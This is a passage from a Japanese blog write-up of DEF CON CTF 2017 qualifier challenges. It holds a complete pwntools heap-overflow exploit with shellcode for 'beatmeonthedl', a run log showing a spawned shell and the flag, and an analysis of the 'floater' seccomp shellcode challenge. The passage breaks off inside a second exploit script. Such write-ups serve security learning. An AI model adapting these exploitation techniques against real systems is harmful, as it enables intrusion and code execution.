+<span id="cb17-4"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-5"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-5" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></span>
+<span id="cb17-6"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-6" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> sys</span>
+<span id="cb17-7"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-8"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-8" aria-hidden="true" tabindex="-1"></a>username <span class="op">=</span> <span class="st">&#39;mcfly&#39;</span></span>
+<span id="cb17-9"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-9" aria-hidden="true" tabindex="-1"></a>password <span class="op">=</span> <span class="st">&#39;awesnap&#39;</span></span>
+<span id="cb17-10"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-10" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-11"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-11" aria-hidden="true" tabindex="-1"></a>buffer_size <span class="op">=</span> <span class="bn">0x38</span></span>
+<span id="cb17-12"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-12" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-13"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-13" aria-hidden="true" tabindex="-1"></a><span class="co"># [0x0040123c]&gt; f~reloc.puts</span></span>
+<span id="cb17-14"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-14" aria-hidden="true" tabindex="-1"></a><span class="co"># 0x00609958 8 reloc.puts_88</span></span>
+<span id="cb17-15"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-15" aria-hidden="true" tabindex="-1"></a>addr_puts_got <span class="op">=</span> <span class="bn">0x00609958</span></span>
+<span id="cb17-16"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-16" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-17"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-17" aria-hidden="true" tabindex="-1"></a>context(os<span class="op">=</span><span class="st">&#39;linux&#39;</span>, arch<span class="op">=</span><span class="st">&#39;amd64&#39;</span>)</span>
+<span id="cb17-18"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-18" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-19"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-19" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="st">&#39;remote&#39;</span> <span class="kw">in</span> sys.argv:</span>
+<span id="cb17-20"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-20" aria-hidden="true" tabindex="-1"></a>    r <span class="op">=</span> remote(<span class="st">&#39;beatmeonthedl_498e7cad3320af23962c78c7ebe47e16.quals.shallweplayaga.me&#39;</span>, <span class="dv">6969</span>)</span>
+<span id="cb17-21"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-21" aria-hidden="true" tabindex="-1"></a><span class="cf">else</span>:</span>
+<span id="cb17-22"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-22" aria-hidden="true" tabindex="-1"></a>    r <span class="op">=</span> process(<span class="st">&#39;./beatmeonthedl&#39;</span>)</span>
+<span id="cb17-23"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-23" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-24"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-24" aria-hidden="true" tabindex="-1"></a><span class="co"># login</span></span>
+<span id="cb17-25"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-25" aria-hidden="true" tabindex="-1"></a>r.recvuntil(<span class="st">&#39;Enter username: &#39;</span>)</span>
+<span id="cb17-26"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-26" aria-hidden="true" tabindex="-1"></a>r.sendline(username)</span>
+<span id="cb17-27"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-27" aria-hidden="true" tabindex="-1"></a>r.recvuntil(<span class="st">&#39;Enter Pass: &#39;</span>)</span>
+<span id="cb17-28"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-28" aria-hidden="true" tabindex="-1"></a>r.sendline(password)</span>
+<span id="cb17-29"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-29" aria-hidden="true" tabindex="-1"></a>r.recvuntil(<span class="st">&#39;I) Request Exploit.&#39;</span>)</span>
+<span id="cb17-30"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-30" aria-hidden="true" tabindex="-1"></a>log.success(<span class="st">&#39;login successful!&#39;</span>)</span>
+<span id="cb17-31"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-31" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-32"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-32" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> choose_action(n):</span>
+<span id="cb17-33"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-33" aria-hidden="true" tabindex="-1"></a>    r.recvuntil(<span class="st">&#39;) Go Away.</span><span class="ch">\n</span><span class="st">| &#39;</span>)</span>
+<span id="cb17-34"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-34" aria-hidden="true" tabindex="-1"></a>    r.sendline(<span class="bu">str</span>(n))</span>
+<span id="cb17-35"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-35" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-36"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-36" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> add_request(text):</span>
+<span id="cb17-37"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-37" aria-hidden="true" tabindex="-1"></a>    choose_action(<span class="dv">1</span>)</span>
+<span id="cb17-38"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-38" aria-hidden="true" tabindex="-1"></a>    r.recvuntil(<span class="st">&#39;Request text &gt; &#39;</span>)</span>
+<span id="cb17-39"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-39" aria-hidden="true" tabindex="-1"></a>    r.send(text)</span>
+<span id="cb17-40"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-40" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-41"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-41" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> delete_request(n):</span>
+<span id="cb17-42"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-42" aria-hidden="true" tabindex="-1"></a>    choose_action(<span class="dv">3</span>)</span>
+<span id="cb17-43"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-43" aria-hidden="true" tabindex="-1"></a>    r.recvuntil(<span class="st">&#39;choice: &#39;</span>)</span>
+<span id="cb17-44"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-44" aria-hidden="true" tabindex="-1"></a>    r.sendline(<span class="bu">str</span>(n))</span>
+<span id="cb17-45"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-45" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-46"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-46" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> update_request(n, text):</span>
+<span id="cb17-47"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-47" aria-hidden="true" tabindex="-1"></a>    choose_action(<span class="dv">4</span>)</span>
+<span id="cb17-48"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-48" aria-hidden="true" tabindex="-1"></a>    r.recvuntil(<span class="st">&#39;choice: &#39;</span>)</span>
+<span id="cb17-49"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-49" aria-hidden="true" tabindex="-1"></a>    r.sendline(<span class="bu">str</span>(n))</span>
+<span id="cb17-50"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-50" aria-hidden="true" tabindex="-1"></a>    r.recvuntil(<span class="st">&#39;data: &#39;</span>)</span>
+<span id="cb17-51"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-51" aria-hidden="true" tabindex="-1"></a>    r.send(text)</span>
+<span id="cb17-52"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-52" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-53"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-53" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> go_away():</span>
+<span id="cb17-54"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-54" aria-hidden="true" tabindex="-1"></a>    choose_action(<span class="dv">5</span>)</span>
+<span id="cb17-55"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-55" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-56"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-56" aria-hidden="true" tabindex="-1"></a>log.info(<span class="st">&#39;alloc 0x38 bytes buffer x5&#39;</span>)</span>
+<span id="cb17-57"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-57" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">0</span>, <span class="dv">5</span>):</span>
+<span id="cb17-58"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-58" aria-hidden="true" tabindex="-1"></a>    add_request(<span class="st">&#39;buffer</span><span class="sc">{}</span><span class="st">&#39;</span>.<span class="bu">format</span>(i))</span>
+<span id="cb17-59"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-59" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-60"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-60" aria-hidden="true" tabindex="-1"></a>log.info(<span class="st">&#39;free buffer3 and buffer1&#39;</span>)</span>
+<span id="cb17-61"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-61" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> i <span class="kw">in</span> [<span class="dv">3</span>, <span class="dv">1</span>]:</span>
+<span id="cb17-62"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-62" aria-hidden="true" tabindex="-1"></a>    delete_request(i)</span>
+<span id="cb17-63"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-63" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-64"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-64" aria-hidden="true" tabindex="-1"></a>log.info(<span class="st">&#39;overwrite chunk4 via buffer2&#39;</span>)</span>
+<span id="cb17-65"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-65" aria-hidden="true" tabindex="-1"></a>buf <span class="op">=</span> <span class="st">&#39;&#39;</span></span>
+<span id="cb17-66"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-66" aria-hidden="true" tabindex="-1"></a>buf <span class="op">+=</span> <span class="st">&#39;A&#39;</span> <span class="op">*</span> buffer_size    <span class="co"># buffer2</span></span>
+<span id="cb17-67"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-67" aria-hidden="true" tabindex="-1"></a>buf <span class="op">+=</span> <span class="st">&#39;A&#39;</span> <span class="op">*</span> <span class="dv">8</span>              <span class="co"># chunk4&#39;s size</span></span>
+<span id="cb17-68"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-68" aria-hidden="true" tabindex="-1"></a>buf <span class="op">+=</span> <span class="st">&#39;A&#39;</span> <span class="op">*</span> <span class="dv">8</span>              <span class="co"># chunk4&#39;s fd</span></span>
+<span id="cb17-69"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-69" aria-hidden="true" tabindex="-1"></a>update_request(<span class="dv">2</span>, buf)</span>
+<span id="cb17-70"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-70" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-71"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-71" aria-hidden="true" tabindex="-1"></a>log.info(<span class="st">&#39;leak chunk4</span><span class="ch">\&#39;</span><span class="st">s bk&#39;</span>)</span>
+<span id="cb17-72"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-72" aria-hidden="true" tabindex="-1"></a>choose_action(<span class="dv">2</span>)</span>
+<span id="cb17-73"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-73" aria-hidden="true" tabindex="-1"></a>r.recvuntil(buf)</span>
+<span id="cb17-74"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-74" aria-hidden="true" tabindex="-1"></a>leak <span class="op">=</span> r.recvuntil(<span class="st">&#39;</span><span class="ch">\n</span><span class="st">&#39;</span>)[:<span class="op">-</span><span class="dv">1</span>]</span>
+<span id="cb17-75"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-75" aria-hidden="true" tabindex="-1"></a>addr_chunk2    <span class="op">=</span> u64(leak <span class="op">+</span> <span class="st">&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span> <span class="op">*</span> (<span class="dv">8</span> <span class="op">-</span> <span class="bu">len</span>(leak)))</span>
+<span id="cb17-76"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-76" aria-hidden="true" tabindex="-1"></a>addr_heap_base <span class="op">=</span> addr_chunk2 <span class="op">-</span> <span class="bn">0x60</span></span>
+<span id="cb17-77"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-77" aria-hidden="true" tabindex="-1"></a>log.success(<span class="st">&#39;addr_chunk2:    0x</span><span class="sc">{:x}</span><span class="st">&#39;</span>.<span class="bu">format</span>(addr_chunk2))</span>
+<span id="cb17-78"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-78" aria-hidden="true" tabindex="-1"></a>log.success(<span class="st">&#39;addr_heap_base: 0x</span><span class="sc">{:x}</span><span class="st">&#39;</span>.<span class="bu">format</span>(addr_heap_base))</span>
+<span id="cb17-79"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-79" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-80"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-80" aria-hidden="true" tabindex="-1"></a>log.info(<span class="st">&#39;write shellcode to buffer0&#39;</span>)</span>
+<span id="cb17-81"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-81" aria-hidden="true" tabindex="-1"></a>buf <span class="op">=</span> <span class="st">&#39;&#39;</span></span>
+<span id="cb17-82"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-82" aria-hidden="true" tabindex="-1"></a>buf <span class="op">+=</span> asm(shellcraft.sh())</span>
+<span id="cb17-83"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-83" aria-hidden="true" tabindex="-1"></a>buf <span class="op">+=</span> <span class="st">&#39;</span><span class="ch">\x90</span><span class="st">&#39;</span> <span class="op">*</span> (buffer_size <span class="op">-</span> <span class="dv">8</span> <span class="op">-</span> <span class="bu">len</span>(buf))    <span class="co"># buffer0</span></span>
+<span id="cb17-84"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-84" aria-hidden="true" tabindex="-1"></a>buf <span class="op">+=</span> <span class="st">&#39;</span><span class="ch">\xeb\xce</span><span class="st">&#39;</span>       <span class="co"># $ rasm2 -a x86 -b 64 &#39;jmp -0x30&#39;</span></span>
+<span id="cb17-85"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-85" aria-hidden="true" tabindex="-1"></a>buf <span class="op">+=</span> <span class="st">&#39;</span><span class="ch">\x90</span><span class="st">&#39;</span> <span class="op">*</span> (<span class="bn">0x80</span> <span class="op">-</span> <span class="bu">len</span>(buf))</span>
+<span id="cb17-86"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-86" aria-hidden="true" tabindex="-1"></a>update_request(<span class="dv">0</span>, buf)</span>
+<span id="cb17-87"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-87" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-88"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-88" aria-hidden="true" tabindex="-1"></a>log.info(<span class="st">&#39;overwrite chunk4 via buffer2&#39;</span>)</span>
+<span id="cb17-89"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-89" aria-hidden="true" tabindex="-1"></a>buf <span class="op">=</span> <span class="st">&#39;&#39;</span></span>
+<span id="cb17-90"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-90" aria-hidden="true" tabindex="-1"></a>buf <span class="op">+=</span> <span class="st">&#39;A&#39;</span> <span class="op">*</span> buffer_size</span>
+<span id="cb17-91"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-91" aria-hidden="true" tabindex="-1"></a>buf <span class="op">+=</span> p64(<span class="bn">0x41</span>)                    <span class="co"># size</span></span>
+<span id="cb17-92"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-92" aria-hidden="true" tabindex="-1"></a>buf <span class="op">+=</span> p64(addr_puts_got <span class="op">-</span> <span class="bn">0x18</span>)    <span class="co"># fd</span></span>
+<span id="cb17-93"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-93" aria-hidden="true" tabindex="-1"></a>update_request(<span class="dv">2</span>, buf)</span>
+<span id="cb17-94"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-94" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-95"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-95" aria-hidden="true" tabindex="-1"></a>log.info(<span class="st">&#39;free buffer4&#39;</span>)</span>
+<span id="cb17-96"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-96" aria-hidden="true" tabindex="-1"></a>delete_request(<span class="dv">4</span>)</span>
+<span id="cb17-97"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-97" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-98"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-98" aria-hidden="true" tabindex="-1"></a>log.info(<span class="st">&#39;trigger shellcode&#39;</span>)</span>
+<span id="cb17-99"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-99" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-100"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-100" aria-hidden="true" tabindex="-1"></a>r.interactive()</span></code></pre></div>
+<pre><code>$ ./exploit.py remote
+[+] Opening connection to beatmeonthedl_498e7cad3320af23962c78c7ebe47e16.quals.shallweplayaga.me on port 6969: Done
+[+] login successful!
+[*] alloc 0x38 bytes buffer x5
+[*] free buffer3 and buffer1
+[*] overwrite chunk4 via buffer2
+[*] leak chunk4&#39;s bk
+[+] addr_chunk2:    0x17e6060
+[+] addr_heap_base: 0x17e6000
+[*] write shellcode to buffer0
+[*] overwrite chunk4 via buffer2
+[*] free buffer4
+[*] trigger shellcode
+[*] Switching to interactive mode
+$ ls
+beatmeonthedl
+flag
+$ cat flag
+The flag is: 3asy p33zy h3ap hacking!!
+$ 
+[*] Closed connection to beatmeonthedl_498e7cad3320af23962c78c7ebe47e16.quals.shallweplayaga.me port 6969</code></pre>
+<h2 id="floater">floater</h2>
+<p>x86-64 の ELF.</p>
+<pre><code>$ file floater
+floater: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=303c68e5ee9256abcf9e3d1297eaf1e48e2e72fe, stripped, with debug_info
+
+$ checksec --file floater 
+[*] &#39;/tmp/floater&#39;
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      PIE enabled</code></pre>
+<p>プログラムの主な処理を調べていくと次のような感じだった. いわゆるシステムコールが制限された環境での shellcode 問題なのがわかるが, shellcode を流し込む方法がちょっと特殊.</p>
+<ol type="1">
+<li><code>mmap</code> で読み書き可な領域を確保</li>
+<li>25回入力を読み込み, それぞれある処理 (後述) をしてから確保した領域に書き込む</li>
+<li>確保した領域を <code>mprotect</code> で書き込み不可/実行可にする</li>
+<li>seccomp で <code>open</code>, <code>read</code>, <code>write</code>, <code>close</code>, <code>exit</code> 以外の システムコールを無効にする</li>
+<li>確保した領域を <code>call</code> する</li>
+</ol>
+<p>その25回入力を読み込んでいる部分がこんな感じ.<br />
+<code>read</code> で読み込んだ文字列を <code>strtof</code> で <code>float</code> に変換し, その値を <code>sub.pow_6f0</code> で処理した結果 (<code>xmm0</code>, 4つの <code>float</code> か 2つの <code>double</code> が入る 128bits の SSE レジスタ) を確保した領域に <code>movss</code> (<strong>mov</strong>e <strong>s</strong>calar <strong>s</strong>ingle-precision floating-point value) で書き込んでいるのがわかる.</p>
+<pre><code>|       .-&gt; 0x000014f8      83bd6cffffff.  cmp dword [rbp - counter], 0x32 ; [0x32:4]=0x400000 ; &#39;2&#39;
+|      ,==&lt; 0x000014ff      0f8d57000000   jge 0x155c
+|      ||   0x00001505      31ff           xor edi, edi
+|      ||   0x00001507      ba64000000     mov edx, 0x64               ; &#39;d&#39;
+|      ||   0x0000150c      488db570ffff.  lea rsi, qword [rbp - local_90h]
+|      ||   0x00001513      e8d8080000     call sub.read_df0          ; ssize_t read(int fildes, void *buf, size_t nbyte)
+|      ||   0x00001518      31d2           xor edx, edx
+|      ||   0x0000151a      89d6           mov esi, edx
+|      ||   0x0000151c      488dbd70ffff.  lea rdi, qword [rbp - local_90h]
+|      ||   0x00001523      898534ffffff   mov dword [rbp - local_cch], eax
+|      ||   0x00001529      e8c2fbffff     call sym.imp.strtof         ; xmm0 &lt;- result; float strtof(const char *str, char**endptr)
+|      ||   0x0000152e      bf03000000     mov edi, 3
+|      ||   0x00001533      e8b8010000     call sub.pow_6f0
+|      ||   0x00001538      4863b56cffff.  movsxd rsi, dword [rbp - counter]
+|      ||   0x0000153f      488b4de0       mov rcx, qword [rbp - mmaped_buf]
+|      ||   0x00001543      f30f1104b1     movss dword [rcx + rsi*4], xmm0
+|      ||   0x00001548      8b856cffffff   mov eax, dword [rbp - counter]
+|      ||   0x0000154e      83c002         add eax, 2
+|      ||   0x00001551      89856cffffff   mov dword [rbp - counter], eax
+|      |`=&lt; 0x00001557      e99cffffff     jmp 0x14f8
+|      |       ; JMP XREF from 0x000014ff (main)
+|      `--&gt; 0x0000155c      b8c8000000     mov eax, 0xc8</code></pre>
+<p>そして<code>sub.pow_6f0</code> の処理は, 入力した値 * 1000 + 0.5 を <a href="http://en.cppreference.com/w/c/numeric/math/floor" target="_blank" rel="nofollow noopener"><code>floor</code></a> してから 1000 で割った値を <code>float</code> で返すというものだった.</p>
+<p>まとめると,</p>
+<ol type="1">
+<li><strong>shellcode は↑の処理を通しても変化しない25個の <code>float</code> 値で送る必要がある</strong>
+<ul>
+<li>小数点以下の数を持っていなければいい?</li>
+</ul></li>
+<li><strong>shellcode の 4bytes 毎に 0x00000000 が入ることを考慮する必要がある</strong>
+<ul>
+<li>送られた <code>float</code> 値 (32bits) は 64bits の領域に順に書き込まれるため</li>
+</ul></li>
+</ol>
+<p>いろいろ試したところ, shellcode を 3bytesの命令 + 0x68 (<code>push imm32</code>) で構成することで上手く行った.<br />
+例えば <code>mov rdi, rax</code> は 0x48 0x89 0xc7, <code>push 0</code> は 0x68 0x00 0x00 0x00 0x00 となり, little-endian に直したときの下位 32bits の値 0x68c78948 を <code>float</code> として解釈してみると 7.538266577407427e+24 になるという感じである.</p>
+<pre><code>$ python
+Python 2.7.13 (default, Feb 11 2017, 12:22:40) 
+[GCC 6.3.1 20170109] on linux2
+Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
+&gt;&gt;&gt; import struct
+&gt;&gt;&gt; struct.unpack(&#39;!f&#39;, &#39;\x68\xc7\x89\x48&#39;)[0]
+7.538266577407427e+24</code></pre>
+<p>実際に作成したスクリプトと実行結果は次の通り.<br />
+使えるシステムコールが限定されているので, Flag を <code>open</code> -&gt; <code>read</code> -&gt; <code>write</code> する shellcode を書いた. この縛りでファイル名 <code>&quot;flag&quot;</code> を生成することは厳しかったので, 最初に <code>read</code> してこちらから送り込むことで対処した. また, <code>mov rdi, 数値</code> のような命令は 3bytes に収まらないので, <code>xor rax, rax ; lea rdi, [rax+数値]</code> のような命令で何とかした.</p>
+<div class="sourceCode" id="cb22"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb22-1"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/usr/bin/env python2</span></span>
+<span id="cb22-2"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb22-3"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-3" aria-hidden="true" tabindex="-1"></a><span class="co"># DEF CON 2017 Quals : floater</span></span>
+<span id="cb22-4"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb22-5"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-5" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></span>
+<span id="cb22-6"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-6" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> struct</span>
+<span id="cb22-7"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-7" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> sys</span>
+<span id="cb22-8"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb22-9"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-9" aria-hidden="true" tabindex="-1"></a>context(os<span class="op">=</span><span class="st">&#39;linux&#39;</span>, arch<span class="op">=</span><span class="st">&#39;amd64&#39;</span>)</span>
+<span id="cb22-10"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-10" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb22-11"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-11" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="st">&#39;remote&#39;</span> <span class="kw">in</span> sys.argv:</span>
+<span id="cb22-12"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-12" aria-hidden="true" tabindex="-1"></a>    r <span class="op">=</span> remote(<span class="st">&#39;floater_f128edcd6c7ecd2ceac15235749c1565.quals.shallweplayaga.me&#39;</span>, <span class="dv">754</span>)</span>
+<span id="cb22-13"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-13" aria-hidden="true" tabindex="-1"></a><span class="cf">else</span>:</span>
+<span id="cb22-14"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-14" aria-hidden="true" tabindex="-1"></a>    r <span class="op">=</span> process(<span class="st">&#39;./floater-patched&#39;</span>)</span>
+<span id="cb22-15"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-15" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb22-16"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-16" aria-hidden="true" tabindex="-1"></a>shellcode <span class="op">=</span> [</span>
+<span id="cb22-17"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-17" aria-hidden="true" tabindex="-1"></a>    <span class="co"># read(0, stack, 0x80)</span></span>
